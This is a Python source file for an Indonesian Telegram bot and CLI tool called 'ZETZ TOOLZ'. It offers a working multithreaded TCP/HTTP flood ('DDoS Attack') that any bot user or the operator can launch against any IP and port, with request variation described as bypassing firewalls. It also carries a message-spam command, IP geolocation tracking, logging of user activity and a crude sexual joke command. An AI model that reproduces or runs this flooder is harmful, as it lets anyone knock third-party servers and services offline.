import time
import sys
import re
import threading
import random
import webbrowser
import socket
import datetime
import os
import json
import telebot
from telebot import types
import requests
from colorama import Fore, Style, init
import qrcode
from PIL import Image, ImageDraw, ImageFont
import io
from urllib.parse import urlparse
import subprocess

# Inisialisasi colorama
init(autoreset=True)

# Variabel global
stop_ddos = False
telegram_bot = None
user_logs = {}
active_ddos_attacks = {}
qr_custom_templates = {}

# ========== FUNGSI AMBIL PASSWORD DARI GITLAB ==========
def fetch_password_from_gitlab():
    """Ambil password dari GitLab raw file"""
    try:
        url = "https://gitlab.com/deemzet999/pwdzetztoolz/-/raw/main/db.txt"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            
            # Pattern untuk cari password
            patterns = [
                r'password\s*[:=]\s*["\']([^"\']+)["\']',
                r'correct_password\s*[:=]\s*["\']([^"\']+)["\']',
                r'pass\s*[:=]\s*["\']([^"\']+)["\']',
                r'key\s*[:=]\s*["\']([^"\']+)["\']'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    return matches[0]
            
            # Jika pattern tidak ketemu, ambil semua teks
            lines = content.strip().split('\n')
            for line in lines:
                if line and len(line) > 5 and not line.startswith('#'):
                    return line.strip()
                    
    except Exception as e:
        print(Fore.RED + f"Error mengambil password: {e}")
    
    return "default_password_123"  # Fallback password

# Ambil password
correct_password = fetch_password_from_gitlab()

# ========== FUNGSI UTILITAS ==========
def clear_terminal():
    """Membersihkan layar terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Loading"):
    print(Fore.YELLOW + text, end="")
    for _ in range(10):
        time.sleep(0.5)
        print(Fore.YELLOW + ".", end="", flush=True)
    print(Fore.GREEN + "\n" + text + " selesai!")

def display_access_message():
    clear_terminal()
    print(Fore.CYAN + "=" * 60)
    print(Fore.MAGENTA + "   ██████╗ ███████╗███████╗████████╗     █████╗ ██╗")
    print(Fore.MAGENTA + "  ██╔════╝ ██╔════╝██╔════╝╚══██╔══╝    ██╔══██╗██║")
    print(Fore.MAGENTA + "  ██║  ███╗█████╗  █████╗     ██║       ███████║██║")
    print(Fore.MAGENTA + "  ██║   ██║██╔══╝  ██╔══╝     ██║       ██╔══██║██║")
    print(Fore.MAGENTA + "  ╚██████╔╝███████╗███████╗   ██║       ██║  ██║███████╗")
    print(Fore.MAGENTA + "   ╚═════╝ ╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚══════╝")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "╔══════════════════════════════════════════════════════╗")
    print(Fore.YELLOW + "║           ZETZ TOOLZ v2.0 - TELEGRAM EDITION          ║")
    print(Fore.YELLOW + "╚══════════════════════════════════════════════════════╝")
    print(Fore.CYAN + "├────────────────────────────────────────────────────────┤")
    print(Fore.GREEN + "│ Developer : DeemZet                                   │")
    print(Fore.GREEN + "│ Version   : 2.0                                       │")
    print(Fore.GREEN + "│ Status    : " + Fore.RED + "ACTIVE" + Fore.GREEN + "                                    │")
    print(Fore.CYAN + "└────────────────────────────────────────────────────────┘")

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_current_date_and_day():
    now = datetime.datetime.now()
    current_date = now.strftime("%d %B %Y")
    current_day = now.strftime("%A")
    
    days_translation = {
        "Monday": "Senin",
        "Tuesday": "Selasa",
        "Wednesday": "Rabu",
        "Thursday": "Kamis",
        "Friday": "Jum'at",
        "Saturday": "Sabtu",
        "Sunday": "Ahad"
    }
    return current_date, days_translation.get(current_day, current_day)

def track_ip(ip):
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if ip_pattern.match(ip):
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
            data = response.json()
            location = data.get("loc", "Lokasi tidak ditemukan")
            city = data.get("city", "Kota tidak ditemukan")
            region = data.get("region", "Region tidak ditemukan")
            country = data.get("country", "Negara tidak ditemukan")
            org = data.get("org", "ISP tidak diketahui")
            return f"""
🌐 *IP TRACKER RESULT*
├─ 📡 IP: `{ip}`
├─ 🏙️ Kota: {city}
├─ 🗺️ Region: {region}
├─ 🇺🇳 Negara: {country}
├─ 📍 Koordinat: {location}
└─ 🏢 ISP: {org}
"""
        except Exception as e:
            return f"❌ Error tracking IP: {e}"
    else:
        return "❌ Format IP tidak valid."

# ========== FUNGSI QR GENERATOR ==========
def generate_qr_code(data, filename="qrcode.png", fill_color="black", back_color="white", size=10):
    """Generate QR Code standar"""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=size,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color=fill_color, back_color=back_color)
        img.save(filename)
        return True, filename
    except Exception as e:
        return False, str(e)

def generate_custom_qr_with_image(data, image_path, output_filename="custom_qr.png"):
    """Generate QR Code dengan gambar di tengah"""
    try:
        # Generate QR dasar
        qr = qrcode.QRCode(
            version=5,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        
        qr_img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
        
        # Buka gambar logo
        logo = Image.open(image_path)
        
        # Resize logo
        qr_width, qr_height = qr_img.size
        logo_size = qr_width // 4
        logo = logo.resize((logo_size, logo_size), Image.Resampling.LANCZOS)
        
        # Posisi tengah
        pos = ((qr_width - logo_size) // 2, (qr_height - logo_size) // 2)
        
        # Tempel logo ke QR
        qr_img.paste(logo, pos)
        
        qr_img.save(output_filename)
        return True, output_filename
    except Exception as e:
        return False, str(e)

def generate_qr_from_photo(photo_file, data, output_filename="photo_qr.png"):
    """Generate QR dengan foto yang diupload"""
    try:
        # Simpan foto sementara
        temp_photo = "temp_photo.jpg"
        with open(temp_photo, 'wb') as f:
            f.write(photo_file)
        
        success, result = generate_custom_qr_with_image(data, temp_photo, output_filename)
        
        # Hapus file temp
        os.remove(temp_photo)
        
        return success, result
    except Exception as e:
        return False, str(e)

# ========== FUNGSI DDoS ==========
def ddos_attack(target, port, duration, thread_count):
    global stop_ddos
    stop_ddos = False
    start_time = time.time()
    attack_id = f"{target}:{port}_{int(time.time())}"
    active_ddos_attacks[attack_id] = {"target": target, "port": port, "active": True}
    
    def flood():
        packets_sent = 0
        while not stop_ddos and time.time() < start_time + duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                # Variasi packet untuk bypass firewall
                packet = f"GET /{random.randint(1000,9999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                s.send(packet.encode())
                s.close()
                packets_sent += 1
                time.sleep(0.001)  # Rate limiting
            except:
                pass
        
        active_ddos_attacks[attack_id]["active"] = False
        active_ddos_attacks[attack_id]["packets_sent"] = packets_sent
    
    print(Fore.RED + f"[DDoS] Launching {thread_count} threads to {target}:{port}")
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    return attack_id

def stop_all_ddos():
    global stop_ddos
    stop_ddos = True
    time.sleep(2)
    return "✅ Semua serangan DDoS dihentikan"

# ========== FUNGSI TELEGRAM BOT ==========
def start_telegram_bot(token):
    """Memulai bot Telegram"""
    global telegram_bot, user_logs
    
    try:
        telegram_bot = telebot.TeleBot(token)
        print(Fore.GREEN + f"[TELEGRAM] Bot started with token: {token[:20]}...")
        
        @telegram_bot.message_handler(commands=['start'])
        def send_welcome(message):
            user_logs[message.chat.id] = {
                'username': message.from_user.username,
                'first_name': message.from_user.first_name,
                'user_id': message.from_user.id,
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'join_date': time.strftime("%Y-%m-%d")
            }
            
            # Kirim foto menu.png jika ada
            try:
                if os.path.exists("menu.png"):
                    with open("menu.png", 'rb') as photo:
                        telegram_bot.send_photo(message.chat.id, photo, 
                                              caption=f"👋 Welcome *{message.from_user.first_name}*!\n🤖 *ZetzAI Telegram Bot v2.0*",
                                              parse_mode='Markdown')
                else:
                    # Buat foto menu otomatis jika tidak ada
                    create_menu_image(message.from_user.first_name)
                    with open("menu.png", 'rb') as photo:
                        telegram_bot.send_photo(message.chat.id, photo,
                                              caption=f"👋 Welcome *{message.from_user.first_name}*!\n🤖 *ZetzAI Telegram Bot v2.0*",
                                              parse_mode='Markdown')
            except Exception as e:
                print(Fore.RED + f"[ERROR] Failed to send menu image: {e}")
                telegram_bot.reply_to(message, 
                    f"👋 Welcome *{message.from_user.first_name}*!\n🤖 *ZetzAI Telegram Bot v2.0*",
                    parse_mode='Markdown')
            
            # Tunggu 2 detik
            time.sleep(2)
            
            # Kirim audio
            try:
                if os.path.exists("audio.mp3"):
                    with open("audio.mp3", 'rb') as audio:
                        telegram_bot.send_audio(message.chat.id, audio, 
                                              title="Powered by ZetzAI",
                                              performer="DeemZet")
                elif os.path.exists("PoweredByZetz.mp3"):
                    with open("PoweredByZetz.mp3", 'rb') as audio:
                        telegram_bot.send_audio(message.chat.id, audio,
                                              title="Powered by ZetzAI",
                                              performer="DeemZet")
            except Exception as e:
                print(Fore.YELLOW + f"[WARN] Audio not sent: {e}")
            
            # Kirim keyboard menu
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            btn1 = types.KeyboardButton('🛠️ Tools')
            btn2 = types.KeyboardButton('🔍 Track IP')
            btn3 = types.KeyboardButton('⚡ DDoS Attack')
            btn4 = types.KeyboardButton('🤖 AI Chat')
            btn5 = types.KeyboardButton('📱 QR Generator')
            btn6 = types.KeyboardButton('📊 Status')
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
            
            telegram_bot.reply_to(message, 
                "Pilih menu di bawah atau ketik /menu untuk melihat semua perintah:",
                reply_markup=markup)
            
            print(Fore.CYAN + f"[LOG] User {message.from_user.username} ({message.chat.id}) started bot")
        
        @telegram_bot.message_handler(commands=['menu'])
        def show_menu(message):
            menu_text = """
*🔧 ZETZAI MENU*

*🛠️ TOOLS*
/ddos <ip> <port> <duration> - Launch DDoS attack
/ddos_stop - Stop all attacks
/track <ip> - Track IP location
/spam <count> <message> - Spam message
/calc <expression> - Calculator
/qr <text> - Generate QR Code
/qrcustom <text> - QR with custom image (reply to photo)
/scanport <ip> - Port scanning

*🤖 FUN*
/joke - Random joke
/fact - Random fact
/cekkontol <nama> - Cek persentase kontol
/roll <number> - Random roll
/coin - Flip coin

*📊 STATUS*
/status - Bot status
/users - Show active users
/attack - Show active attacks
/broadcast <message> - Broadcast to all users

*👑 ADMIN*
/ban <user_id> - Ban user
/unban <user_id> - Unban user
/logs - Show logs
"""
            telegram_bot.reply_to(message, menu_text, parse_mode='Markdown')
        
        @telegram_bot.message_handler(commands=['ddos'])
        def ddos_command(message):
            try:
                parts = message.text.split()
                if len(parts) == 4:
                    target = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    
                    if port < 1 or port > 65535:
                        telegram_bot.reply_to(message, "❌ Port harus antara 1-65535")
                        return
                    
                    if duration > 300:
                        telegram_bot.reply_to(message, "⚠️ Durasi maksimal 300 detik (5 menit)")
                        duration = 300
                    
                    telegram_bot.reply_to(message, f"⚡ Starting DDoS attack on {target}:{port} for {duration}s")
                    
                    attack_id = ddos_attack(target, port, duration, 150)
                    
                    # Monitor dan kirim update
                    threading.Thread(target=monitor_ddos, args=(message, attack_id, duration)).start()
                else:
                    telegram_bot.reply_to(message, "Usage: /ddos <ip> <port> <duration>\nContoh: /ddos 192.168.1.1 80 60")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {str(e)}")
        
        def monitor_ddos(message, attack_id, duration):
            start_time = time.time()
            while time.time() < start_time + duration and active_ddos_attacks.get(attack_id, {}).get("active", False):
                time.sleep(5)
                elapsed = int(time.time() - start_time)
                if elapsed % 15 == 0:  # Update setiap 15 detik
                    try:
                        telegram_bot.send_message(message.chat.id, 
                                                f"⚡ Attack {attack_id.split('_')[0]} - {elapsed}/{duration}s")
                    except:
                        pass
            
            # Attack finished
            packets = active_ddos_attacks.get(attack_id, {}).get("packets_sent", 0)
            telegram_bot.send_message(message.chat.id, 
                                    f"✅ Attack finished!\n📊 Packets sent: {packets}")
        
        @telegram_bot.message_handler(commands=['ddos_stop'])
        def ddos_stop_command(message):
            result = stop_all_ddos()
            telegram_bot.reply_to(message, result)
        
        @telegram_bot.message_handler(commands=['track'])
        def track_command(message):
            try:
                parts = message.text.split()
                if len(parts) == 2:
                    result = track_ip(parts[1])
                    telegram_bot.reply_to(message, result, parse_mode='Markdown')
                else:
                    telegram_bot.reply_to(message, "Usage: /track <ip>\nContoh: /track 8.8.8.8")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {e}")
        
        @telegram_bot.message_handler(commands=['spam'])
        def spam_command(message):
            try:
                parts = message.text.split(maxsplit=2)
                if len(parts) == 3:
                    count = int(parts[1])
                    text = parts[2]
                    
                    if count > 50:
                        telegram_bot.reply_to(message, "⚠️ Maksimal 50 spam")
                        count = 50
                    
                    telegram_bot.reply_to(message, f"📢 Spamming {count} times...")
                    
                    for i in range(count):
                        telegram_bot.send_message(message.chat.id, f"{text} [{i+1}]")
                        time.sleep(0.3)
                    
                    telegram_bot.reply_to(message, f"✅ Spam completed!")
                else:
                    telegram_bot.reply_to(message, "Usage: /spam <count> <message>")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {e}")
        
        @telegram_bot.message_handler(commands=['cekkontol'])
        def cekkontol_command(message):
            try:
                parts = message.text.split(maxsplit=1)
                if len(parts) == 2:
                    nama = parts[1]
                    percent = random.randint(0, 100)
                    size = random.choice(["kecil", "sedang", "besar", "raksasa", "micro"])
                    response = f"""
🧐 *CEK KONTOL RESULT*
├─ 👤 Nama: {nama}
├─ 📊 Persentase: {percent}%
├─ 📏 Ukuran: {size}
└─ 💬 Verdict: {'Eww kontolnya!' if percent > 50 else 'Lumayan lah'}
                    """
                    telegram_bot.reply_to(message, response, parse_mode='Markdown')
                else:
                    telegram_bot.reply_to(message, "Usage: /cekkontol <nama>")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {e}")
        
        @telegram_bot.message_handler(commands=['qr'])
        def qr_command(message):
            try:
                parts = message.text.split(maxsplit=1)
                if len(parts) == 2:
                    data = parts[1]
                    
                    if len(data) > 500:
                        telegram_bot.reply_to(message, "❌ Data terlalu panjang (max 500 karakter)")
                        return
                    
                    telegram_bot.reply_to(message, "🔄 Generating QR Code...")
                    
                    filename = f"qr_{message.chat.id}_{int(time.time())}.png"
                    success, result = generate_qr_code(data, filename)
                    
                    if success:
                        with open(filename, 'rb') as photo:
                            telegram_bot.send_photo(message.chat.id, photo,
                                                  caption=f"📱 QR Code untuk:\n`{data[:100]}{'...' if len(data) > 100 else ''}`",
                                                  parse_mode='Markdown')
                        os.remove(filename)
                    else:
                        telegram_bot.reply_to(message, f"❌ Gagal generate QR: {result}")
                else:
                    telegram_bot.reply_to(message, "Usage: /qr <text/url>\nContoh: /qr https://github.com")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {e}")
        
        @telegram_bot.message_handler(commands=['qrcustom'], content_types=['text'])
        def qrcustom_text_command(message):
            if message.reply_to_message and message.reply_to_message.photo:
                parts = message.text.split(maxsplit=1)
                if len(parts) == 2:
                    data = parts[1]
                    
                    # Minta user untuk kirim foto dulu
                    telegram_bot.reply_to(message, "📸 Silakan reply foto dengan caption /qrcustom <text>")
                else:
                    telegram_bot.reply_to(message, "Usage: Reply foto dengan caption /qrcustom <text>")
            else:
                telegram_bot.reply_to(message, "Kirim /qrcustom <text> dengan me-reply sebuah foto")
        
        @telegram_bot.message_handler(content_types=['photo'], func=lambda m: m.caption and m.caption.startswith('/qrcustom'))
        def qrcustom_photo_command(message):
            try:
                # Extract data from caption
                parts = message.caption.split(maxsplit=1)
                if len(parts) == 2:
                    data = parts[1]
                    
                    telegram_bot.reply_to(message, "🔄 Membuat custom QR Code...")
                    
                    # Download photo
                    file_info = telegram_bot.get_file(message.photo[-1].file_id)
                    downloaded_file = telegram_bot.download_file(file_info.file_path)
                    
                    filename = f"customqr_{message.chat.id}_{int(time.time())}.png"
                    success, result = generate_qr_from_photo(downloaded_file, data, filename)
                    
                    if success:
                        with open(filename, 'rb') as photo:
                            telegram_bot.send_photo(message.chat.id, photo,
                                                  caption=f"🎨 Custom QR Code\nData: `{data[:50]}{'...' if len(data) > 50 else ''}`",
                                                  parse_mode='Markdown')
                        os.remove(filename)
                    else:
                        telegram_bot.reply_to(message, f"❌ Gagal: {result}")
                else:
                    telegram_bot.reply_to(message, "Usage: Kirim foto dengan caption /qrcustom <text>")
            except Exception as e:
                telegram_bot.reply_to(message, f"❌ Error: {e}")
        
        @telegram_bot.message_handler(commands=['status'])
        def status_command(message):
            status_text = f"""
*🤖 BOT STATUS*
├─ 👥 Active Users: {len(user_logs)}
├─ ⚡ Active Attacks: {len([a for a in active_ddos_attacks.values() if a.get('active')])}
├─ 🕒 Uptime: {time.strftime('%H:%M:%S')}
├─ 📡 Server: Online
├─ 🔧 Version: 2.1
├─ 🐍 Python: {sys.version.split()[0]}
└─ 👑 Developer: @DeemZetz
            """
            telegram_bot.reply_to(message, status_text, parse_mode='Markdown')
        
        @telegram_bot.message_handler(commands=['users'])
        def users_command(message):
            if not user_logs:
                telegram_bot.reply_to(message, "📭 Belum ada user yang aktif")
                return
            
            users_text = "*👥 ACTIVE USERS*\n\n"
            for idx, (user_id, data) in enumerate(list(user_logs.items())[:20], 1):
                username = data.get('username', 'No username')
                first_name = data.get('first_name', 'Unknown')
                users_text += f"{idx}. {first_name} (@{username})\n"
            
            if len(user_logs) > 20:
                users_text += f"\n... dan {len(user_logs) - 20} user lainnya"
            
            telegram_bot.reply_to(message, users_text, parse_mode='Markdown')
        
        @telegram_bot.message_handler(func=lambda message: True)
        def handle_all_messages(message):
            # Log user activity
            if message.chat.id not in user_logs:
                user_logs[message.chat.id] = {}
            
            user_logs[message.chat.id].update({
                'last_message': message.text,
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'message_count': user_logs[message.chat.id].get('message_count', 0) + 1
            })
            
            # Tampilkan di CLI
            username = message.from_user.username or message.from_user.first_name
            print(Fore.CYAN + f"[TELEGRAM] {username}: {message.text}")
            
            # Handle button responses
            if message.text == '🛠️ Tools':
                tools_text = """
*🛠️ AVAILABLE TOOLS*
• /ddos - DDoS Attack
• /track - IP Tracker
• /spam - Spam Message
• /qr - QR Generator
• /scanport - Port Scanner
                """
                telegram_bot.reply_to(message, tools_text, parse_mode='Markdown')
            
            elif message.text == '🔍 Track IP':
                telegram_bot.reply_to(message, "Kirim: /track <ip_address>")
            
            elif message.text == '⚡ DDoS Attack':
                telegram_bot.reply_to(message, "Kirim: /ddos <ip> <port> <duration>")
            
            elif message.text == '📱 QR Generator':
                qr_text = """
*📱 QR GENERATOR*
• /qr <text> - Generate normal QR
• /qrcustom <text> - QR with custom image
   (reply to photo with this command)
                """
                telegram_bot.reply_to(message, qr_text, parse_mode='Markdown')
            
            elif message.text == '📊 Status':
                status_command(message)
            
            elif message.text == '🤖 AI Chat':
                ai_text = """
*🤖 ZETZAI CHAT*
Halo! Saya ZetzAI 🤖
Saya bisa bantu dengan:
• Generate QR Code
• DDoS Attacks
• IP Tracking
• Dan banyak lagi!

Ketik /menu untuk semua perintah
                """
                telegram_bot.reply_to(message, ai_text, parse_mode='Markdown')
        
        # Jalankan bot di thread terpisah
        bot_thread = threading.Thread(target=telegram_bot.polling, kwargs={'non_stop': True, 'timeout': 60})
        bot_thread.daemon = True
        bot_thread.start()
        
        print(Fore.GREEN + "[BOT] Telegram bot started successfully!")
        return True
        
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to start bot: {e}")
        return False

def create_menu_image(username="User"):
    """Buat gambar menu jika tidak ada"""
    try:
        img = Image.new('RGB', (800, 600), color='black')
        draw = ImageDraw.Draw(img)
        
        # Judul
        draw.text((400, 100), "ZETZAI BOT", fill='white', anchor='mm', font_size=50)
        draw.text((400, 180), f"Welcome {username}", fill='cyan', anchor='mm', font_size=30)
        
        # Menu items
        menu_items = [
            "🛠️ Tools - /ddos, /track, /spam",
            "📱 QR Generator - /qr, /qrcustom",
            "🤖 AI Chat - Interactive chat",
            "📊 Status - /status, /users",
            "👑 Admin - /broadcast, /logs"
        ]
        
        y = 250
        for item in menu_items:
            draw.text((100, y), item, fill='white', font_size=24)
            y += 50
        
        draw.text((400, 550), "Powered by DeemZet", fill='yellow', anchor='mm', font_size=20)
        
        img.save("menu.png")
        print(Fore.GREEN + "[IMAGE] Menu image created successfully")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to create menu image: {e}")

def show_user_logs():
    """Tampilkan log user di CLI"""
    if not user_logs:
        print(Fore.YELLOW + "[LOG] No active users yet")
        return
    
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "📊 ACTIVE USER LOGS")
    print(Fore.CYAN + "=" * 60)
    
    for user_id, data in user_logs.items():
        username = data.get('username', 'No username')
        first_name = data.get('first_name', 'Unknown')
        last_seen = data.get('last_seen', 'Never')
        msg_count = data.get('message_count', 0)
        
        print(Fore.GREEN + f"👤 {username} ({first_name})")
        print(Fore.WHITE + f"   ID: {user_id}")
        print(Fore.WHITE + f"   Messages: {msg_count}")
        print(Fore.WHITE + f"   Last seen: {last_seen}")
        print(Fore.CYAN + "-" * 40)

# ========== FUNGSI UTAMA ==========
def main():
    display_access_message()
    
    # Password check
    password = input(Fore.CYAN + "\n🔐 Masukkan password: " + Fore.WHITE)
    if password != correct_password:
        print(Fore.RED + "❌ Password salah! Access denied.")
        sys.exit(1)
    
    print(Fore.GREEN + "✅ Password benar! Access granted.")
    time.sleep(1)
    
    # Minta token bot Telegram
    print(Fore.YELLOW + "\n" + "=" * 60)
    print(Fore.CYAN + "🤖 TELEGRAM BOT SETUP")
    print(Fore.YELLOW + "=" * 60)
    
    token = input(Fore.CYAN + "📝 Masukkan Telegram Bot Token: " + Fore.WHITE)
    
    if not token:
        print(Fore.RED + "❌ Token tidak valid!")
        sys.exit(1)
    
    print(Fore.YELLOW + "🚀 Starting Telegram Bot...")
    loading_animation("Starting bot")
    
    if start_telegram_bot(token):
        print(Fore.GREEN + "✅ Bot Telegram berhasil dijalankan!")
        print(Fore.CYAN + "📢 Bot sekarang aktif di Telegram")
        print(Fore.YELLOW + "💡 Gunakan /start di Telegram untuk memulai")
        print(Fore.MAGENTA + "✨ Fitur baru: QR Generator dengan custom image!")
    else:
        print(Fore.RED + "❌ Gagal memulai bot!")
        return
    
    # Main CLI loop
    while True:
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.YELLOW + "🖥️  ZETZAI COMMAND LINE")
        print(Fore.CYAN + "=" * 60)
        print(Fore.GREEN + "1. Show User Logs")
        print(Fore.GREEN + "2. Send Broadcast Message")
        print(Fore.GREEN + "3. Start DDoS Attack")
        print(Fore.GREEN + "4. Track IP")
        print(Fore.GREEN + "5. Bot Status")
        print(Fore.GREEN + "6. Generate QR Code")
        print(Fore.GREEN + "7. Stop All DDoS")
        print(Fore.RED + "8. Exit")
        print(Fore.CYAN + "=" * 60)
        
        choice = input(Fore.CYAN + "❯ Pilih menu (1-8): " + Fore.WHITE)
        
        if choice == "1":
            show_user_logs()
        
        elif choice == "2":
            if telegram_bot and user_logs:
                message = input(Fore.CYAN + "📢 Broadcast message: " + Fore.WHITE)
                if message:
                    print(Fore.YELLOW + f"📤 Broadcasting to {len(user_logs)} users...")
                    success = 0
                    for user_id in user_logs.keys():
                        try:
                            telegram_bot.send_message(user_id, f"📢 *BROADCAST*\n{message}", parse_mode='Markdown')
                            success += 1
                        except:
                            pass
                    print(Fore.GREEN + f"✅ Broadcast sent to {success}/{len(user_logs)} users")
            else:
                print(Fore.RED + "❌ No active users or bot not running")
        
        elif choice == "3":
            target = input(Fore.CYAN + "🎯 Target IP: " + Fore.WHITE)
            port = input(Fore.CYAN + "🔌 Port (default 80): " + Fore.WHITE) or "80"
            duration = input(Fore.CYAN + "⏱️  Duration (seconds, max 300): " + Fore.WHITE) or "60"
            
            try:
                port = int(port)
                duration = int(duration)
                result = ddos_attack(target, port, duration, 100)
                print(Fore.GREEN + f"✅ Attack started: {result}")
            except Exception as e:
                print(Fore.RED + f"❌ Error: {e}")
        
        elif choice == "4":
            ip = input(Fore.CYAN + "🔍 IP Address: " + Fore.WHITE)
            result = track_ip(ip)
            print(Fore.GREEN + result)
        
        elif choice == "5":
            print(Fore.CYAN + "=" * 60)
            print(Fore.YELLOW + "🤖 BOT STATUS")
            print(Fore.CYAN + "=" * 60)
            print(Fore.GREEN + f"Active Users: {len(user_logs)}")
            print(Fore.GREEN + f"Active Attacks: {len([a for a in active_ddos_attacks.values() if a.get('active')])}")
            print(Fore.GREEN + f"Bot Running: {'Yes' if telegram_bot else 'No'}")
            print(Fore.GREEN + f"Uptime: {time.strftime('%H:%M:%S')}")
            print(Fore.CYAN + "=" * 60)
        
        elif choice == "6":
            data = input(Fore.CYAN + "📝 QR Code data: " + Fore.WHITE)
            if data:
                filename = f"qr_cli_{int(time.time())}.png"
                success, result = generate_qr_code(data, filename)
                if success:
                    print(Fore.GREEN + f"✅ QR Code generated: {filename}")
                    
                    # Tanya mau custom?
                    custom = input(Fore.CYAN + "🎨 Add custom image? (y/n): " + Fore.WHITE)
                    if custom.lower() == 'y':
                        img_path = input(Fore.CYAN + "📁 Image path: " + Fore.WHITE)
                        if os.path.exists(img_path):
                            custom_filename = f"custom_qr_{int(time.time())}.png"
                            success2, result2 = generate_custom_qr_with_image(data, img_path, custom_filename)
                            if success2:
                                print(Fore.GREEN + f"✅ Custom QR generated: {custom_filename}")
                                os.remove(filename)
                                filename = custom_filename
                            else:
                                print(Fore.RED + f"❌ Failed: {result2}")
                    
                    # Buka file
                    open_file = input(Fore.CYAN + "👀 Open file? (y/n): " + Fore.WHITE)
                    if open_file.lower() == 'y':
                        os.system(f'start {filename}' if os.name == 'nt' else f'open {filename}')
                else:
                    print(Fore.RED + f"❌ Failed: {result}")
        
        elif choice == "7":
            result = stop_all_ddos()
            print(Fore.GREEN + result)
        
        elif choice == "8":
            print(Fore.YELLOW + "👋 Shutting down...")
            if telegram_bot:
                try:
                    telegram_bot.stop_polling()
                except:
                    pass
            sys.exit(0)
        
        else:
            print(Fore.RED + "❌ Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n👋 Program interrupted by user")
        sys.exit(0)